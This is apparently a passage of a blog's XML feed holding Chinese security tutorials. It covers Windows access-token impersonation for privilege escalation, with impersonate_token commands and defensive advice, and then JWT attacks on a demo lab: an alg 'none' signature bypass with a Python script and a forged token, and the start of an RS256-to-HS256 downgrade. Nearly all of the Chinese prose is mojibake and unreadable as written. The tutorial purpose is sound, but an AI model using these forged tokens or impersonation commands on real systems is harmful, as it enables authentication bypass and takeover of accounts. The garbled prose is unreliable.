<p>   Impresonation Tokenï¼šæ¨¡æ‹Ÿä»¤ç‰Œï¼Œå®ƒæ˜¯éäº¤äº’çš„ä¼šè¯ã€‚</p>
</blockquote>
<p>å¾—åˆ°æˆæƒä»¤ç‰Œï¼š		</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\IUSR</span><br><span class="line">NT AUTHORITY\LOCAL SERVICE</span><br><span class="line">NT AUTHORITY\NETWORK SERVICE</span><br><span class="line">NT AUTHORITY\SYSTEM</span><br><span class="line">TEST\Administrator</span><br><span class="line">TEST\yhy</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°æ¨¡æ‹Ÿä»¤ç‰Œï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NT AUTHORITY\ANONYMOUS LOGON</span><br></pre></td></tr></table></figure>

<p>ä¼ªé€ æˆæƒä»¤ç‰Œï¼Œå°±å¯ä»¥æ‹¥æœ‰å®ƒçš„æƒé™äº†ï¼Œä½¿ç”¨ä¸‹é¢å‘½ä»¤è·å–å¯¹åº”tokençš„æƒé™</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">impersonate_token &#x27;TEST\Administrator&#x27;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085137.png" alt="image-20210128223730735"></p>
<p>ä½¿ç”¨<code>drop_token</code>è¿”å›ä¹‹å‰çš„tokenï¼Œå’Œ <code>rev2self</code> ä¸€æ ·</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210220085141.png" alt="image-20210128223804482"></p>
<p>Windows è®¿é—®ä»¤ç‰Œæ˜¯ç”¨æˆ·ç™»å½•ååˆ†é…çš„ç”¨äºæ ‡è¯†ç”¨æˆ·æƒé™çš„å¯¹è±¡ï¼Œé€šè¿‡å¤åˆ¶ä»¤ç‰Œï¼Œæˆ‘ä»¬å¯ä»¥æ‘¸æ‹Ÿè¯¥ä»¤ç‰Œä»£è¡¨çš„ç”¨æˆ·ã€‚å…¸å‹çš„ç”¨æ³•æ˜¯è·å– SYSTEM æƒé™ï¼Œä»¥åŠæŸ¥çœ‹æœ¬æœºæ˜¯å¦æœ‰åŸŸæ§è´¦å·çš„ä»¤ç‰Œï¼Œç„¶åçªƒå–è¯¥ä»¤ç‰Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåŸŸã€‚</p>
<h2 id="0x03-ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡æªæ–½"><a href="#0x03-ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡æªæ–½" class="headerlink" title="0x03 ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡æªæ–½"></a>0x03 ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡æªæ–½</h2><p>é’ˆå¯¹ä»¤ç‰Œçªƒå–ææƒçš„é˜²å¾¡æªæ–½å¦‚ä¸‹ï¼š</p>
<ul>
<li>ä¸ºäº†é˜²æ­¢åŸŸç®¡ç†å‘˜çš„ä»¤ç‰Œè¢«çªƒå–ï¼Œåº”è¯¥ç¦æ­¢åŸŸç®¡ç†å‘˜ç™»å½•å…¶å®ƒä¸»æœºã€‚å¦‚æœç™»å½•äº†ï¼Œä½¿ç”¨å®Œååº”è¯¥åŠæ—¶é‡å¯ç”µè„‘ï¼Œä»è€ŒæŠŠä»¤ç‰Œæ¸…é™¤ã€‚</li>
<li>åŠæ—¶å®‰è£…å¾®è½¯æ¨é€çš„è¡¥ä¸</li>
<li>å¯¹äºæ¥è·¯ä¸æ˜çš„æˆ–è€…å±é™©çš„è½¯ä»¶ï¼Œæ—¢ä¸è¦åœ¨ç³»ç»Ÿä¸­ä½¿ç”¨ï¼Œä¹Ÿä¸è¦åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨</li>
<li>å¯¹ä»¤ç‰Œçš„æ—¶æ•ˆæ€§è¿›è¡Œé™åˆ¶ï¼Œä»¥é˜²æ­¢æ•£åˆ—å€¼è¢«ç ´è§£åæ³„éœ²æœ‰æ•ˆçš„ä»¤ç‰Œä¿¡æ¯</li>
<li>å¯¹äºä»¤ç‰Œï¼Œåº”é‡‡å–åŠ å¯†å­˜å‚¨åŠå¤šé•¿éªŒè¯ä¿æŠ¤</li>
<li>ä½¿ç”¨åŠ å¯†é“¾è·¯SSL&#x2F;TLSä¼ è¾“ä»¤ç‰Œï¼Œä»¥é˜²æ­¢è¢«ä¸­é—´äººçªƒå¬</li>
</ul>
]]></content>
      <categories>
        <category>åŸŸæ¸—é€</category>
      </categories>
      <tags>
        <tag>Windowsææƒ</tag>
        <tag>åŸŸæ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆæ¢JWT</title>
    <url>/2021/03/05/%E5%88%9D%E6%8E%A2JWT/</url>
    <content><![CDATA[<blockquote>
<p>  å½“ä½ è¿·èŒ«æ—¶ï¼Œå°±å»å­¦ä¹ æ–°ä¸œè¥¿</p>
</blockquote>
<h1 id="åˆæ¢JWT"><a href="#åˆæ¢JWT" class="headerlink" title="åˆæ¢JWT"></a>åˆæ¢JWT</h1><h2 id="0x01-ä»€ä¹ˆæ˜¯JWT"><a href="#0x01-ä»€ä¹ˆæ˜¯JWT" class="headerlink" title="0x01 ä»€ä¹ˆæ˜¯JWT"></a>0x01 ä»€ä¹ˆæ˜¯JWT</h2><p><strong>JWT</strong> å…¨ç§°ä¸º <strong>JSON Web Tokens</strong> ï¼Œæ˜¯ä¸ºäº†åœ¨ç½‘ç»œåº”ç”¨ç¯å¢ƒé—´ä¼ é€’å£°æ˜è€Œæ‰§è¡Œçš„ä¸€ç§åŸºäºJSON çš„å¼€æ”¾æ ‡å‡† (RFC 7519)ï¼Œè¯¥ token è¢«è®¾è®¡ä¸ºç´§å‡‘ä¸”å®‰å…¨çš„ï¼Œå®ƒçš„ä¸¤å¤§ä½¿ç”¨åœºæ™¯æ˜¯ï¼šè®¤è¯å’Œæ•°æ®äº¤æ¢ï¼Œç‰¹åˆ«é€‚ç”¨äºåˆ†å¸ƒå¼ç«™ç‚¹çš„å•ç‚¹ç™»å½•ï¼ˆSSOï¼‰åœºæ™¯ã€‚JWTçš„å£°æ˜ä¸€èˆ¬è¢«ç”¨æ¥åœ¨èº«ä»½æä¾›è€…å’ŒæœåŠ¡æä¾›è€…é—´ä¼ é€’è¢«è®¤è¯çš„ç”¨æˆ·èº«ä»½ä¿¡æ¯ï¼Œä»¥ä¾¿äºä»èµ„æºæœåŠ¡å™¨è·å–èµ„æºï¼Œä¹Ÿå¯ä»¥å¢åŠ ä¸€äº›é¢å¤–çš„å…¶å®ƒä¸šåŠ¡é€»è¾‘æ‰€å¿…é¡»çš„å£°æ˜ä¿¡æ¯ï¼Œè¯¥tokenä¹Ÿå¯ç›´æ¥è¢«ç”¨äºè®¤è¯ï¼Œä¹Ÿå¯è¢«åŠ å¯†ã€‚</p>
<h2 id="0x02-JWTç»„æˆ"><a href="#0x02-JWTç»„æˆ" class="headerlink" title="0x02 JWTç»„æˆ"></a>0x02 JWTç»„æˆ</h2><p>ä¸€ä¸ªJWTå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå®ƒç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œ<strong>å¤´éƒ¨</strong>ã€<strong>è½½è·</strong>ä¸<strong>ç­¾å</strong>ï¼Œä¸­é—´ç”¨ <code>.</code> åˆ†éš”ï¼Œä¾‹å¦‚ï¼š<code>xxxxx.yyyyy.zzzzz</code></p>
<h4 id="2-1-å¤´éƒ¨-header"><a href="#2-1-å¤´éƒ¨-header" class="headerlink" title="2.1 å¤´éƒ¨(header)"></a>2.1 å¤´éƒ¨(header)</h4><p>å¤´éƒ¨é€šå¸¸ç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼šä»¤ç‰Œçš„ç±»å‹ï¼ˆå³ JWTï¼‰å’Œæ­£åœ¨ä½¿ç”¨çš„ç­¾åç®—æ³•ï¼ˆå¦‚ HMAC SHA256 æˆ– RSA.ï¼‰ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨ <code>Base64url</code> ç¼–ç å¾—åˆ°å¤´éƒ¨ï¼Œå³ <code>xxxxx</code>ã€‚</p>
<blockquote>
<p>  <strong>Base64URLç®—æ³•</strong></p>
<p>  è¯¥ç®—æ³•å’Œå¸¸è§Base64ç®—æ³•ç±»ä¼¼ï¼Œç¨æœ‰å·®åˆ«ã€‚Base64ä¸­ç”¨çš„ä¸‰ä¸ªå­—ç¬¦æ˜¯â€+â€ï¼Œâ€&#x2F;â€œå’Œâ€&#x3D;â€ï¼Œç”±äºåœ¨URLä¸­æœ‰ç‰¹æ®Šå«ä¹‰ï¼Œå› æ­¤Base64URLä¸­å¯¹ä»–ä»¬åšäº†æ›¿æ¢ï¼šâ€&#x3D;â€å»æ‰ï¼Œâ€+â€ç”¨â€-â€œæ›¿æ¢ï¼Œâ€&#x2F;â€œç”¨â€_â€æ›¿æ¢ï¼Œè¿™å°±æ˜¯Base64URLç®—æ³•ã€‚</p>
</blockquote>
<h4 id="2-2-è½½è·-Payload"><a href="#2-2-è½½è·-Payload" class="headerlink" title="2.2 è½½è·(Payload)"></a>2.2 è½½è·(Payload)</h4><p>è½½è·ä¸­æ”¾ç½®äº† <code>token</code> çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼Œä»¥å¸®åŠ©æ¥æ”¶å®ƒçš„æœåŠ¡å™¨æ¥ç†è§£è¿™ä¸ª <code>token</code>ã€‚åŒæ—¶è¿˜å¯ä»¥åŒ…å«ä¸€äº›è‡ªå®šä¹‰çš„ä¿¡æ¯ã€‚</p>
<p>JWT å®˜æ–¹è§„å®šäº†7ä¸ªï¼Œä¹Ÿå°±æ˜¯é¢„å®šä¹‰ï¼ˆRegistered claimsï¼‰çš„è½½è·ï¼Œä¾›é€‰ç”¨ã€‚</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iss&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://localhost:8000/auth/login&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span> <span class="number">1451888119</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span> <span class="number">1454516119</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;nbf&quot;</span><span class="punctuation">:</span> <span class="number">1451888119</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;jti&quot;</span><span class="punctuation">:</span> <span class="string">&quot;37c107e4609ddbcc9c096ea5ee76c667&quot;</span><span class="punctuation">,</span> </span><br><span class="line">  <span class="attr">&quot;aud&quot;</span><span class="punctuation">:</span> <span class="string">&quot;dev&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>  sub (subject)ï¼šä¸»é¢˜</p>
<p>  iss (issuer)ï¼šç­¾å‘äºº</p>
<p>  iat (Issued At)ï¼šç­¾å‘æ—¶é—´</p>
<p>  exp (expiration time)ï¼šè¿‡æœŸæ—¶é—´</p>
<p>  nbf (Not Before)ï¼šç”Ÿæ•ˆæ—¶é—´</p>
<p>  jti (JWT ID)ï¼šç¼–å·</p>
<p>  aud (audience)ï¼šå—ä¼—</p>
</blockquote>
<p>é™¤äº†ä»¥ä¸Šå­—æ®µä¹‹å¤–ï¼Œä½ å®Œå…¨å¯ä»¥æ·»åŠ è‡ªå·±æƒ³è¦çš„ä»»ä½•å­—æ®µï¼Œè¿™é‡Œè¿˜æ˜¯æé†’ä¸€ä¸‹ï¼Œç”±äºJWTçš„æ ‡å‡†ï¼Œä¿¡æ¯æ˜¯ä¸åŠ å¯†çš„ï¼Œæ‰€ä»¥ä¸€äº›æ•æ„Ÿä¿¡æ¯æœ€å¥½ä¸è¦æ·»åŠ åˆ°jsoné‡Œé¢</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Name&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Age&quot;</span><span class="punctuation">:</span><span class="number">18</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>å°†ä¸Šé¢çš„ <code>json</code> è¿›è¡Œ <code>Base64url</code> ç¼–ç å¾—åˆ°è½½è·ï¼Œå³ <code>yyyyy</code>ã€‚</p>
<h4 id="2-3-ç­¾å-Signature"><a href="#2-3-ç­¾å-Signature" class="headerlink" title="2.3 ç­¾å(Signature)"></a>2.3 ç­¾å(Signature)</h4><p>ç­¾åæ—¶éœ€è¦ç”¨åˆ°ç¼–ç è¿‡çš„headerã€ç¼–ç è¿‡çš„payloadã€ä¸€ä¸ªç§˜é’¥ï¼ˆè¿™ä¸ªç§˜é’¥åªæœ‰æœåŠ¡ç«¯çŸ¥é“ï¼‰ï¼Œç­¾åç®—æ³•æ˜¯headerä¸­æŒ‡å®šçš„é‚£ä¸ªï¼Œå¦‚æœä»¥ <code>HMACSHA256</code> åŠ å¯†ï¼Œå°±å¦‚ä¸‹ï¼š</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">  base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>

<p>åŠ å¯†åå†è¿›è¡Œ <code>Base64url</code> ç¼–ç æœ€åå¾—åˆ°çš„å­—ç¬¦ä¸²å°±æ˜¯ <code>token</code> çš„ç¬¬ä¸‰éƒ¨åˆ† <code>zzzzz</code>ã€‚</p>
<p>ç»„åˆä¾¿å¯ä»¥å¾—åˆ° <code>tokenï¼šxxxxx.yyyyy.zzzzz</code>ã€‚</p>
<p>ç­¾åçš„ä½œç”¨ï¼šä¿è¯ JWT æ²¡æœ‰è¢«ç¯¡æ”¹è¿‡ï¼ŒåŸç†å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>  HMAC ç®—æ³•æ˜¯ä¸å¯é€†ç®—æ³•ï¼Œç±»ä¼¼ MD5 å’Œ hash ï¼Œä½†å¤šä¸€ä¸ªå¯†é’¥ï¼Œå¯†é’¥ï¼ˆå³ä¸Šé¢çš„ secretï¼‰ç”±æœåŠ¡ç«¯æŒæœ‰ï¼Œå®¢æˆ·ç«¯æŠŠ token å‘ç»™æœåŠ¡ç«¯åï¼ŒæœåŠ¡ç«¯å¯ä»¥æŠŠå…¶ä¸­çš„å¤´éƒ¨å’Œè½½è·å†åŠ ä¸Šäº‹å…ˆçš„ secret å†è¿›è¡Œä¸€æ¬¡ HMAC åŠ å¯†ï¼Œå¾—åˆ°çš„ç»“æœå’Œ token çš„ç¬¬ä¸‰æ®µè¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœä¸€æ ·åˆ™è¡¨æ˜æ•°æ®æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚</p>
<p>  æ³¨æ„ï¼šsecretæ˜¯ä¿å­˜åœ¨æœåŠ¡å™¨ç«¯çš„ï¼Œjwtçš„ç­¾å‘ç”Ÿæˆä¹Ÿæ˜¯åœ¨æœåŠ¡å™¨ç«¯çš„ï¼Œsecretå°±æ˜¯ç”¨æ¥è¿›è¡Œjwtçš„ç­¾å‘å’Œjwtçš„éªŒè¯ï¼Œæ‰€ä»¥ï¼Œå®ƒå°±æ˜¯ä½ æœåŠ¡ç«¯çš„ç§é’¥ï¼Œåœ¨ä»»ä½•åœºæ™¯éƒ½ä¸åº”è¯¥æµéœ²å‡ºå»ã€‚ä¸€æ—¦å®¢æˆ·ç«¯å¾—çŸ¥è¿™ä¸ªsecret, é‚£å°±æ„å‘³ç€å®¢æˆ·ç«¯æ˜¯å¯ä»¥è‡ªæˆ‘ç­¾å‘jwtäº†ã€‚</p>
</blockquote>
<p>çœ‹ä¸€å¼ å›¾å°±æ˜ç™½äº†ï¼š<a href="https://jwt.io/">https://jwt.io/</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305142735.png" alt="image-20210305142629387"></p>
<h2 id="0x03-æ¸—é€æµ‹è¯•ä¸­çš„JWT"><a href="#0x03-æ¸—é€æµ‹è¯•ä¸­çš„JWT" class="headerlink" title="0x03 æ¸—é€æµ‹è¯•ä¸­çš„JWT"></a>0x03 æ¸—é€æµ‹è¯•ä¸­çš„JWT</h2><h4 id="3-1-æ•æ„Ÿä¿¡æ¯æ³„éœ²"><a href="#3-1-æ•æ„Ÿä¿¡æ¯æ³„éœ²" class="headerlink" title="3.1 æ•æ„Ÿä¿¡æ¯æ³„éœ²"></a>3.1 æ•æ„Ÿä¿¡æ¯æ³„éœ²</h4><p>æ˜¾ç„¶ï¼Œç”±äºæœ‰æ•ˆè½½è·æ˜¯ä»¥æ˜æ–‡(<code>Base64url</code>åªæ˜¯ä¸€ç§ç¼–ç æ–¹å¼)å½¢å¼ä¼ è¾“çš„ï¼Œå› æ­¤ï¼Œå¦‚æœæœ‰æ•ˆè½½è·ä¸­å­˜åœ¨æ•æ„Ÿä¿¡æ¯çš„è¯ï¼Œå°±ä¼šå‘ç”Ÿä¿¡æ¯æ³„éœ²ã€‚</p>
<h4 id="3-2-å°†ç­¾åç®—æ³•æ”¹ä¸ºnone"><a href="#3-2-å°†ç­¾åç®—æ³•æ”¹ä¸ºnone" class="headerlink" title="3.2 å°†ç­¾åç®—æ³•æ”¹ä¸ºnone"></a>3.2 å°†ç­¾åç®—æ³•æ”¹ä¸ºnone</h4><p>ç­¾åç®—æ³•å¯ä»¥ç¡®ä¿JWTåœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¼šè¢«æ¶æ„ç”¨æˆ·æ‰€ç¯¡æ”¹ï¼Œä½†å¤´éƒ¨ä¸­çš„<code>alg</code>å­—æ®µå´å¯ä»¥æ”¹ä¸º<code>none</code>ã€‚</p>
<p>å¦å¤–ï¼Œä¸€äº›JWTåº“ä¹Ÿæ”¯æŒnoneç®—æ³•ï¼Œå³ä¸ä½¿ç”¨ç­¾åç®—æ³•ã€‚å½“algå­—æ®µä¸ºç©ºæ—¶ï¼Œåç«¯å°†ä¸æ‰§è¡Œç­¾åéªŒè¯ã€‚</p>
<p>å°†algå­—æ®µæ”¹ä¸ºnoneåï¼Œç³»ç»Ÿå°±ä¼šä»JWTä¸­åˆ é™¤ç›¸åº”çš„ç­¾åæ•°æ®ï¼ˆè¿™æ—¶ï¼ŒJWTå°±ä¼šåªå«æœ‰å¤´éƒ¨ + â€˜.â€™ + æœ‰æ•ˆè½½è· + â€˜.â€™ï¼‰ï¼Œç„¶åå°†å…¶æäº¤ç»™æœåŠ¡å™¨ã€‚</p>
<p>é¶åœºï¼š<a href="https://github.com/Sjord/jwtdemo/">https://github.com/Sjord/jwtdemo/</a></p>
<p>ä»¥ <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a> é¶åœºä½œä¸ºå®éªŒ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305170239.png" alt="image-20210305164337558"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.leCmAQCAuPZiAnnZLj6yUvL2WJ2R9oXZAgvtg04cRC8</span><br></pre></td></tr></table></figure>

<p>å¦‚å›¾ï¼Œå½“å‰ jwt æŒ‡å®šçš„ alg ä¸º HS256 ç®—æ³•</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305170247.png" alt="image-20210305164732797"></p>
<p>å–å‡ºJWTä¸­çš„å¤´éƒ¨<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code>è§£ç åï¼Œå°†ç®—æ³•<code>HS256</code>æ”¹ä¸º<code>none</code>,å†ä½¿ç”¨<code>Base64url</code>ç¼–ç ï¼Œç»“æœä¸º <code>ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0</code> ï¼Œå°†ç»“æœæ›¿æ¢åŸå§‹çš„headerï¼Œå†åŠ ä¸Šè‡ªå·±ä¿®æ”¹å¥½çš„è½½è·(payload)ï¼Œç„¶ååˆ é™¤ç­¾åï¼Œä½†<strong>ä¿ç•™æœ€åä¸€ä¸ªç‚¹</strong>ï¼Œå°†å…¶å‘é€åˆ°æ¼”ç¤ºé¡µé¢ï¼Œçœ‹ server ç«¯æ˜¯å¦æ¥å— none ç®—æ³•ï¼Œä»è€Œç»•è¿‡äº†ç®—æ³•ç­¾åã€‚</p>
<blockquote>
<p>  <a href="https://jwt.io/">https://jwt.io/</a> å°† alg ä¸º none è§†ä¸ºæ¶æ„è¡Œä¸ºï¼Œæ‰€ä»¥ï¼Œæ— æ³•é€šè¿‡åœ¨çº¿å·¥å…·ç”Ÿæˆ JWT, å¯ä»¥è‡ªå·±ç”¨<code>Base64url</code>ç¼–ç åç»„åˆï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸‹é¢ä»£ç </p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"># @Author : yhy</span><br><span class="line">import jwt</span><br><span class="line"></span><br><span class="line">print(jwt.encode(&#123;</span><br><span class="line">&quot;iss&quot;: &quot;http://demo.sjoerdlangkemper.nl/&quot;,</span><br><span class="line">&quot;iat&quot;: 1614933803,</span><br><span class="line">&quot;exp&quot;: 1614935003,</span><br><span class="line">&quot;data&quot;: &#123;</span><br><span class="line">&quot;hello&quot;: &quot;world&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;, key=&#x27;&#x27;, algorithm=&#x27;none&#x27;))</span><br></pre></td></tr></table></figure>

<blockquote>
<p>å¦å¤–ï¼ŒæŸäº› JWT å®ç°å¯¹å¤§å°å†™æ•æ„Ÿï¼Œæ‰€ä»¥ï¼Œå½“noneä¸é€šè¿‡æ—¶ï¼Œå¯ä»¥ç»§ç»­å°è¯• Noneã€nOneã€NONEç­‰ç­‰ã€‚ä¸Šè¿°ä»£ç åªæ”¯æŒnoneï¼Œå…¶å®ƒçš„è¯·è‡ªè¡Œä½¿ç”¨<code>Base64url</code>ç¼–ç ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.</span><br></pre></td></tr></table></figure>

<p>æ”»å‡»æˆåŠŸ</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305170252.png" alt="image-20210305170222663"></p>
<h4 id="3-3-éå¯¹ç§°åŠ å¯†å‘ä¸‹é™çº§ä¸ºå¯¹ç§°åŠ å¯†ï¼ˆå°†RS256ç®—æ³•æ”¹ä¸ºHS256ï¼‰"><a href="#3-3-éå¯¹ç§°åŠ å¯†å‘ä¸‹é™çº§ä¸ºå¯¹ç§°åŠ å¯†ï¼ˆå°†RS256ç®—æ³•æ”¹ä¸ºHS256ï¼‰" class="headerlink" title="3.3 éå¯¹ç§°åŠ å¯†å‘ä¸‹é™çº§ä¸ºå¯¹ç§°åŠ å¯†ï¼ˆå°†RS256ç®—æ³•æ”¹ä¸ºHS256ï¼‰"></a>3.3 éå¯¹ç§°åŠ å¯†å‘ä¸‹é™çº§ä¸ºå¯¹ç§°åŠ å¯†ï¼ˆå°†RS256ç®—æ³•æ”¹ä¸ºHS256ï¼‰</h4><p>ç°åœ¨å¤§å¤šæ•°åº”ç”¨ä½¿ç”¨çš„ç®—æ³•æ–¹æ¡ˆéƒ½é‡‡ç”¨ RSA éå¯¹ç§°åŠ å¯†ï¼Œserver ç«¯ä¿å­˜ç§é’¥ï¼Œç”¨æ¥ç­¾å‘ jwtï¼Œå¯¹ä¼ å›æ¥çš„ jwt ä½¿ç”¨å…¬é’¥è§£å¯†éªŒè¯ã€‚</p>
<p>å¦‚æœåç«¯çš„éªŒè¯æ˜¯æ ¹æ®headerçš„algé€‰æ‹©ç®—æ³•ï¼Œå¹¶ä¸”æ”¯æŒ HS256 å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œ ç¢°åˆ°è¿™ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ä¿®æ”¹ alg ä¸º HS256 å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œç„¶åä½¿ç”¨æˆ‘ä»¬å¯ä»¥è·å–åˆ°çš„å…¬é’¥ä½œä¸º key è¿›è¡Œç­¾ååŠ å¯†ï¼ˆpsï¼šåœ¨é¶åœºä¸­æˆ‘ä»¬æ˜¯ç›´æ¥è·å–ï¼Œåœ¨å®æˆ˜ä¸­ï¼Œå¦‚æœæ˜¯å¯¹å®¢æˆ·è¿›è¡ŒæœåŠ¡çš„è¯ï¼Œæˆ‘ä»¬å¯ä»¥è®©å®¢æˆ·æä¾›å…¬é’¥ï¼Œæ¯•ç«Ÿåªæ˜¯ä¸€ä¸ªå…¬é’¥ï¼Œä¸ºäº†è¯¦ç»†æµ‹å‡ºç³»ç»Ÿæ¼æ´ï¼Œè¿™åº”è¯¥æ˜¯è¢«å…è®¸çš„ï¼Œå¦ä¸€ä¸ªå¯èƒ½çš„æ¥æºæ˜¯æœåŠ¡å™¨çš„TLSè¯ä¹¦ï¼Œä»è¯ä¹¦ä¸­å¯¼å‡ºå…¬é’¥ï¼‰ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå½“æˆ‘ä»¬å°† jwt ä¼ ç»™ server ç«¯çš„æ—¶å€™ï¼Œserver ç«¯å› ä¸ºé»˜è®¤ä½¿ç”¨çš„æ˜¯å…¬é’¥è§£å¯†ï¼Œè€Œç®—æ³•ä¸ºä¿®æ”¹åçš„ HS256 å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œæ­¤æ—¶å³ä¸å­˜åœ¨å…¬é’¥ç§é’¥é—®é¢˜ï¼Œå› ä¸ºå¯¹ç§°å¯†ç ç®—æ³•åªæœ‰ä¸€ä¸ªkeyï¼Œæ‰€ä»¥è‚¯å®šå¯ä»¥æ­£å¸¸è§£å¯†è§£æï¼Œä»è€Œç»•è¿‡äº†ç®—æ³•é™åˆ¶ã€‚</p>
<p>å½“ server ç«¯ä¸¥æ ¼æŒ‡å®šåªå…è®¸ä½¿ç”¨ HMAC æˆ–è€… RSA ç®—æ³•å…¶ä¸­ä¸€ç§æ—¶å€™ï¼Œé‚£è¿™ç§æ”»å‡»æ‰‹æ®µæ˜¯æ²¡æœ‰æ•ˆæœçš„ã€‚</p>
<p>ä½¿ç”¨é¶åœºè¿›è¡Œæ­¤æ¬¡æ”»å‡» <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a> è¿™æ˜¯<code>RS256</code>åŠ å¯†</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306151931.png" alt="image-20210306151929356"></p>
<p>ä»æºç ä¸­ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°å®ƒéœ€è¦ä¸€ä¸ªRS256ç­¾åï¼Œä½†ä¹Ÿæ¥å—ä¸€ä¸ªHS256ç­¾åã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210306151650.png" alt="image-20210306151610286"></p>
<p>é¶åœºçš„å…¬é’¥è·å–ï¼š<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a> </p>
<p><img src="https://cdn.jsdelivr.net/gh/yhy0/PicGoImg@master/WX/20210305172816.png" alt="image-20210305172812817"></p>
<p>å°†å…¬é’¥ä¿å­˜ä¸º<code>public.pem</code>ï¼Œ<strong>ä¸€å®šè¦åœ¨æœ€åç©ºä¸€è¡Œ</strong>ã€<strong>ä¸€å®šè¦åœ¨æœ€åç©ºä¸€è¡Œ</strong>ã€<strong>ä¸€å®šè¦åœ¨æœ€åç©ºä¸€è¡Œ</strong>ï¼Œé‡è¦çš„äº‹æƒ…è¯´ä¸‰é</p>
